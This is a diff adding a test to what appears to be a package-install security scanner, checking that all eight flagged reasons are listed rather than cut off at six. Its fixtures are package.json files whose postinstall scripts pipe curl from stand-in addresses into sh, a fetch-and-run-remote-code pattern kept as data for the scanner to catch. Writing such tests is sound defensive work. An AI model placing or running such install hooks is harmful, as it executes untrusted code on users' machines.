@@ -722,3 +722,21 @@ def test_unreadable_archive_is_an_error_not_a_crash(tmp_path, capsys, name, buil
     err = capsys.readouterr().err
     assert code == 2
     assert "could not be read as an archive" in err and "nothing inside it was checked" in err
+
+
+def test_every_reason_not_to_install_is_printed(tmp_path):
+    """The verdict counts every critical; the list under it used to stop at six
+    per question without a word, so the count and the list disagreed."""
+    files = {
+        f"sub{i}/package.json": json.dumps({
+            "name": f"p{i}", "version": "1.0.0",
+            "scripts": {"postinstall": f"curl -s http://203.0.113.{i}/a.sh | sh"},
+        })
+        for i in range(8)
+    }
+    out = io.StringIO()
+    code = run_scan(str(_tree(tmp_path, files)), fmt="checklist", out=out, err=io.StringIO())
+    text = out.getvalue()
+    assert code == 1
+    assert "8 reasons not to install this yet" in text
+    assert all(f"203.0.113.{i}" in text for i in range(8))
